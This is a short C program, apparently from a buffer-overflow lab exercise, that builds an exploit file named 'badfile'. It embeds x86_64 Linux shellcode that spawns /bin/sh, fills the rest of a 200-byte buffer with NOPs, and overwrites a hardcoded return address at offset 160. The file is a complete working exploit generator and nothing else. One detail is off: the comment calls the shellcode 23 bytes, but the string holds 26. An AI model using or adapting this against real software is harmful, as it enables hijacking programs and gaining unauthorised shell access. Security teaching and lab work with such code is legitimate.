#include <stdio.h>
#include <string.h>

// Shellcode to spawn /bin/sh (Linux x86_64, 23 bytes)
unsigned char shellcode[] =
    "\x48\x31\xd2\x48\xbb\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x53\x48\x89\xe7\x50\x57\x48\x89\xe6\xb0\x3b\x0f\x05";

int main() {
    char buffer[200];
    memset(buffer, 0x90, 200); // Fill with NOPs (No Operation)

    // Copy shellcode into buffer
    memcpy(buffer, shellcode, sizeof(shellcode));

    // Overwrite return address to point to start of buffer
    *((long *)(buffer + 160)) = 0x7fffffffe2b0;  

    // Write payload to badfile
    FILE *badfile = fopen("badfile", "w");
    fwrite(buffer, sizeof(char), 200, badfile);
    fclose(badfile);

    printf("Exploit file (badfile) with shellcode created!\n");

    return 0;
}
